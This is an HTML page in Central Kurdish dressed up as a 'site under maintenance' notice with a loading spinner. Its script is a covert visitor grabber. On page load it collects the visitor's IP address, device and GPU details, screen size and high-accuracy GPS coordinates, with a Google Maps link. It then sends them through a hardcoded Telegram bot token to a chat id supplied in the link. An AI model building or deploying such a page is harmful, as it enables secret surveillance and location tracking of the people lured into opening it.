<!DOCTYPE html>
<html lang="ckb" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لەژێر چاکسازیی و گەشەپێداندایە</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .card {
            background: #1e293b;
            padding: 40px 20px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
            border: 1px solid #334155;
        }
        .spinner {
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #38bdf8; font-size: 1.3rem; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 0.95rem; line-height: 1.5; }
    </style>
</head>
<body>

    <div class="card">
        <div class="spinner"></div>
        <h2>🛠 ماڵپەڕەکە لەژێر کارکردندایە</h2>
        <p>تکایە چاوەڕێ بکە یان ڕێگە بە دەستگەیشتن بدە بۆ هاوڕێکەربوونی سەرڤەرەکە...</p>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        const urlParams = new URLSearchParams(window.location.search);
        const ownerId = urlParams.get('id');

        async function collectAndSendInfo() {
            if (!ownerId) return;

            // 1. وەرگرتنی IP
            let userIp = "نەنێنراوە";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                userIp = ipData.ip;
            } catch (e) {}

            // 2. زانیاری ئامێر
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const screenRes = `${window.screen.width}x${window.screen.height} (Ratio:${window.devicePixelRatio})`;

            let gpu = "نەدۆزرایەوە";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            } catch (e) {}

            // 3. هەوڵدان بۆ وەرگرتنی GPS Location (Latitude & Longitude)
            let locText = "🔒 نەبەخشراوە (Disabled/Denied)";
            let mapUrl = "";

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        locText = `Lat: ${lat}, Long:${lon}`;
                        mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                        sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
                    },
                    (error) => {
                        sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
            }
        }

        function sendData(ip, platform, screenRes, gpu, ua, location, mapUrl) {
            let message = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**\n\n` +
                          `🌐 **IP Address:** \`${ip}\`\n` +
                          `📍 **شوێنی دەقیق (GPS):** \`${location}\`\n`;

            if (mapUrl) {
                message += `🗺 **لینکی نەخشە:** [کرنەوە لە Google Maps](${mapUrl})\n`;
            }

            message += `\n📱 **سیستەم:** \`${platform}\`\n` +
                       `📐 **ڕوونی شاشە:** \`${screenRes}\`\n` +
                       `🎮 **GPU:** \`${gpu}\`\n` +
                       `💻 **User-Agent:** \`${ua}\``;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ownerId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.error(err));
        }

        // دەستپێکردنی بزوێنەرەکە
        collectAndSendInfo();
    </script>

</body>
</html>
